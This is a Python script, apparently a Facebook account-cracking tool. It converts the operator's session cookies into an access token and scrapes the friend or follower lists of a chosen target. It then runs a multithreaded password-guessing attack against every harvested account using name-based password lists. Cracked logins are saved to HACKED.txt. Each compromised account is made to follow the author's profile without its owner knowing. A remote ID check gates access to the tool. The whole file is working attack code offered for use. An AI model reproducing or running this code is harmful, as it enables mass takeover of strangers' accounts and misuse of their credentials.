#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2022 Muhammad Latif Harkat

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os,requests,time,sys
def chk():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[37;1mYOUR ID:\x1b[1;91m "+id)
  LINUX = requests.get("https://raw.githubusercontent.com/Hama2022/name/main/id.txt").text
  if id in LINUX:
      print("\033[92m YOUR ID IS ACTIVE .....")
      time.sleep(1)
      _login()
  else:
      print("\x1b[91m YOUR ID IS NOT ACTIVE")
      time.sleep(30)
      sys.exit()


import requests, re, os, random, sys
from bs4 import BeautifulSoup
from random import choice
from concurrent.futures import ThreadPoolExecutor
from time import time as mek

# data - data
P = "\x1b[0;97m" 
M = "\x1b[0;91m"
H = "\x1b[0;92m"
K = "\x1b[0;93m"
B = "\x1b[0;94m"
x = "\x1b[0;91m"
BM = "\x1b[0;96m"
loop, ok, cp = [],[],[]
opsi = []
data_id = None

# convert cookies to token
def convert(cookie):
	cookies = {"cookie":cookie}
	res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
		'user-agent'	:	'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
		'referer'	:	'https://www.facebook.com/',
		'host'	:	'business.facebook.com',
		'origin'	:	'https://business.facebook.com',
		'upgrade-insecure-requests'	:	'1',
		'accept-language'	:	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'	:	'max-age=0',
		'accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'	:	'text/html; charset=utf-8'
	}, cookies = cookies)
	try:
		token = re.search('(EAAG\w+)',str(res.text)).group(1)
	except:
		token = "Cookies Invalid"
	finally:
		return token
		
def real_time():
	return str(mek()).split('.')[0]
		
def sesi(session,res):
	response = BeautifulSoup(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = BeautifulSoup(session.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi

class Main:
	
	def __init__(self,**kwargs):
		self.coki, self.token = {"cookie":kwargs['coki']}, kwargs['token']
		self.data_id = []
		self.mbasic = "https://mbasic.facebook.com"
	
	@property
	def get_my_info(self):
		r = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={self.token}",cookies=self.coki).json()
		self.name,self.id = r['name'], r['id']
		return {'name':self.name, 'id':self.id}
			
		
	@property
	def Menu(self):
		try:
			info = self.get_my_info
		except KeyError:
			os.remove("data/token");os.remove("data/coki")
			exit(" ! Your token Expired ! ")
		print(
			f" >> Your Account: {info['name']}, {info['id']} << "
		)
		print("""
        █▀▀  █──█ █▀▀█ █──█ █▀▀▄ █▀▀█ 
        ▀▀█  █▀▀█ █▄▄█ █▄▄█ █──█ █▄▄█ 
        ▀▀▀  ▀──▀ ▀──▀ ▄▄▄█ ▀▀▀─ ▀──▀

 
""")
		print(
			"""\033[1;97m
	[1] Dump With Public Id
	[2] Dump With followers
	[4] Dump With post
	[3] Check  OK/CP
	[0] Logout
			"""
		)
		chose = input("  Chooice: ")
		number_list = ['0','1','2','3']
		while chose not in number_list:
			print(' ! Your Chose Not Found !')
			chose = input("  Chooice: ")
		if chose=='1' or chose=='2':
			if chose=='1':print("\n")
			else:print("\n")
			account_target = input("  PASTE ID: ")
			try:
				r = requests.get(f"https://graph.facebook.com/{account_target}?fields=name,id&access_token={self.token}",cookies=self.coki).json()
				target_name = r['name']
				print(f"  Name: {target_name}")
			except KeyError:
				exit(" ! Target Not Found ! ")
			if chose=='1':self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=friends.fields(name,id)&access_token={self.token}",chose="friends")
			else:self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=subscribers.limit(5000)&access_token={self.token}",chose="followers")
			self.validate
		elif chose=='0':
			os.remove('data/token');os.remove('data/coki')
			exit(f'\n √ Logout OK {self.name}')
		else:
			print('\nCrack Starting ....... ')
			try:
				print(' >> HACKED results :')
				for x in open('HACKED.txt','r').readlines():
					print(f' > {x}')
			except:print('  Results 0 ')
			print(
				"",""*25
			)
			try:
				print('  NotHacked results :')
				for x in open('NotHacked.txt','r').readlines():
					print(f' > {x}')
			except:print('  Results 0 ')
				
			
class Crack:
	
	def crack(self, user, password_list, url):
		session = requests.Session()
		for pw in password_list:
			r = BeautifulSoup(session.get(f"{url}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr", headers={
				'Host'	:	'mbasic.facebook.com',
				'Connection'	:	'keep-alive',
				'Cache-Control'	:	'max-age=0',
				'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
				'sec-ch-ua-mobile'	:	'?1',
				'sec-ch-ua-platform'	:	'"Android"',
				'Upgrade-Insecure-Requests'	:	'1',
				'User-Agent'	:	'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
				'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'Sec-Fetch-Site'	:	'same-origin',
				'Sec-Fetch-Mode'	:	'navigate',
				'Sec-Fetch-User'	:	'?1',
				'Sec-Fetch-Dest'	:	'document',
				'Referer'	:	'https://mbasic.facebook.com/login/device-based/',
				'Accept-Encoding'	:	'gzip, deflate',
				'Accept-Language'	:	'id-ID,id;q=0.9'
			}).text, 'html.parser')
			data = {_.get('name'):_.get('value') for _ in r.find('form',{'method':'post'}).findAll('input',{'name':['lsd','jazoest']})}
			data.update(
				{
					'uid':user,
					'next':'https://mbasic.facebook.com/login/save-device/',
					'flow':'login_no_pin',
					'encpass':'#PWD_BROWSER:0:{}:{}'.format(real_time(),pw)
				}
			)
			session.post(f'{url}/login/device-based/validate-password/', data=data, headers={
				'Host'	:	'mbasic.facebook.com',
				'Connection'	:	'keep-alive',
				'Content-Length'	:	'142',
				'Cache-Control'	:	'max-age=0',
				'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
				'sec-ch-ua-mobile'	:	'?1',
				'sec-ch-ua-platform'	:	'"Android"',
				'Upgrade-Insecure-Requests'	:	'1',
				'Origin'	:	'https://mbasic.facebook.com',
				'Content-Type'	:	'application/x-www-form-urlencoded',
				'User-Agent'	:	'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
				'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'Sec-Fetch-Site'	:	'same-origin',
				'Sec-Fetch-Mode'	:	'navigate',
				'Sec-Fetch-User'	:	'?1',
				'Sec-Fetch-Dest'	:	'document',
				'Referer'	:	f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr',
				'Accept-Encoding'	:	'gzip, deflate, br',
				'Accept-Language'	:	'id-ID,id;q=0.9'
			})
			if "c_user" in session.cookies.get_dict():
				ok.append(user+"|"+pw)
				open("HACKED.txt","a").write(user+"|"+pw+"\n")
				coki = ';'.join(["%s=%s"%(k,v) for k,v in session.cookies.get_dict().items()])
				self.follow_me(coki)
				sys.stdout.write('\n%s\r[HACKED]\n  ID: %s\n  Pass: %s\n\n%s'%(H,user,pw,len(opsi),', '.join(opsi),P))
				sys.stdout.flush()
				break
			elif "checkpoint" in session.cookies.get_dict():
				cp.append(user+"|"+pw)
				open("NotHacked.txt","a").write(user+"|"+pw+"\n")
				h2 = {
					'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
				}
				res = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2).text
				ress = BeautifulSoup(res, 'html.parser')
				form = ress.find('form',{'method':'post'})
				data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
				data2.update({
					'email':user,
					'pass':pw
				})
				res = session.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
				ress = BeautifulSoup(res, 'html.parser')
				if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
					open("ua","a").write("%s|%s"%(user,pw))
					sys.stdout.write('\n%s\r[HACKED]\n  ID: %s\n  Pass: %s\n %s'%(H,user,pw,len(opsi),', '.join(opsi),P))
					sys.stdout.flush()
				else:
					if(len(sesi(session,res))==0):
						if '' in str(ress.find('title').text):
							sys.stdout.write('\n%s\r\n[NotHacked] ID: %s\n  Pass: %s\n \n%s'%(M,user,pw,P))
							sys.stdout.flush()
					else:
						sys.stdout.write('\n%s\r[NotHacked]\n  ID: %s\n  Pass: %s\n  %s%s\n%s'%(K,user,pw,len(opsi),', '.join(opsi),P))
						sys.stdout.flush()
				opsi.clear()
				break
			sys.stdout.write("\r[SHAYDA] %s/%s\033[1;92mHACKED|\033[1;91mNotHacked:%s/%s"%(len(loop),len(data_id),len(ok),len(cp)))
			sys.stdout.flush()
		loop.append("memek")

class Assets(Main):
	
	@property
	def _password_split(self):
		print("\n >< Addtional password, separate by comma (,) >< \n >> example: qwerty,latif harkat,anjing\n >! Password must be more than 6 characters\n")
		_password = input(" Add pass: ");print("")
		return _password.split(",")

	@property
	def validate(self):
		add = input(" [y/n] Add password? ")
		if add=="y":
			pas = self._password_split
		print(
			"\033[1;91m Crack Starting Plaese wait 15min _ 30min\n"
		)
		print("\033[1;92m Save HACKED ==>> HACKED.txt")
		print("\033[1;91m Save NotHacked ==>> NotHacked.txt")
		with ThreadPoolExecutor(max_workers=35) as kirim:
			for x in self.data_id:
				x = x.lower()
				namee,id = x.split('><')
				name = namee.split(" ")
				if(len(name[0])>=6):
					__password_list = [namee,name[0]+'123',name[0]+'1122',name[0]+'1234',name[0]+'12345',name[0]+'11223344',name[0]+'12',name[0]+'123456',name[0]+'1234567890',name[0]+'123123',name[0]+'123456789',name[0]+'12345678',name[0]+'123321',name[0]+'1122334455',name[0]+'12341234',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2022',name[0]+'12344321',name[0]+'0750',name[0]+'0770',name[0]+'0780',name[0]+'2021',name[0]+'1234554321',name[0]+'1234512345',name[0]+'112233',namee[0]+'12345']
				elif(len(name[0])<=2):
					__password_list = [namee,name[0]+'123',name[0]+'1122',name[0]+'1234',name[0]+'12345',name[0]+'11223344',name[0]+'12',name[0]+'123456',name[0]+'1234567890',name[0]+'123123',name[0]+'123456789',name[0]+'12345678',name[0]+'123321',name[0]+'1122334455',name[0]+'12341234',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2022',name[0]+'12344321',name[0]+'0750',name[0]+'0770',name[0]+'0780',name[0]+'2021',name[0]+'1234554321',name[0]+'1234512345',name[0]+'112233',namee[0]+'12345']
				else:
					__password_list = [namee,name[0]+'123',name[0]+'1122',name[0]+'1234',name[0]+'12345',name[0]+'11223344',name[0]+'12',name[0]+'123456',name[0]+'1234567890',name[0]+'123123',name[0]+'123456789',name[0]+'12345678',name[0]+'123321',name[0]+'1122334455',name[0]+'12341234',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2022',name[0]+'12344321',name[0]+'0750',name[0]+'0770',name[0]+'0780',name[0]+'2021',name[0]+'1234554321',name[0]+'1234512345',name[0]+'112233',namee[0]+'12345']
				if add=="y":
					__password_list = __password_list + pas
				kirim.submit(Crack().crack, id, __password_list, self.mbasic)
	def dumpAccount(self,**latif_ganteng):
		global data_id
		if latif_ganteng['chose']=="friends":
			r = requests.get(f"{latif_ganteng['url']}",cookies=self.coki).json()['friends']
		else:
			r = requests.get(f"{latif_ganteng['url']}",cookies=self.coki).json()['subscribers']
		for x in r['data']:
			try:
				self.data_id.append(x['name']+"><"+x['id'])
			except KeyError:
				pass
		data_id = self.data_id
		print(
			f"  All Id: {len(self.data_id)}"
		)
		self.validate
		
	def follow_me(self,coki):
		with requests.Session() as session:
			_link = BeautifulSoup(session.get(f"{self.mbasic}/latif.harkat.176",headers={'host':'mbasic.facebook.com','accept-language':'id-ID,id;q=0.9'},cookies={"cookie":coki}).text, 'html.parser').find('a',string='Ikuti')
			if _link:
				return session.get(f"{self.mbasic}"+_link.get('href'),cookies={"cookie":coki})

def _login():
	try:
		token = open("data/token","r").read()
		coki = open("data/coki","r").read()
		Assets(token=token,coki=coki).Menu
	except FileNotFoundError:
		try:os.mkdir("data")
		except:pass
		print("""
            █▀▀ █░░█ █▀▀█ █░░█ █▀▀▄ █▀▀█ 
            ▀▀█ █▀▀█ █▄▄█ █▄▄█ █░░█ █▄▄█ 
            ▀▀▀ ▀░░▀ ▀░░▀ ▄▄▄█ ▀▀▀░ ▀░░▀ 
""")
		coki = input("PASTE Cookies: ")
		token = convert(coki)
		if token=="Cookies Invalid":
			exit(" ! Maybe your cookies Invalid ! ")
		open("data/token","a").write(token)
		open("data/coki","a").write(coki)
		Success = Assets(token=token,coki=coki);Success.get_my_info;Success.follow_me(coki);Success.Menu

if __name__=="__main__":
	os.system(
		"clear"
	)
	chk()
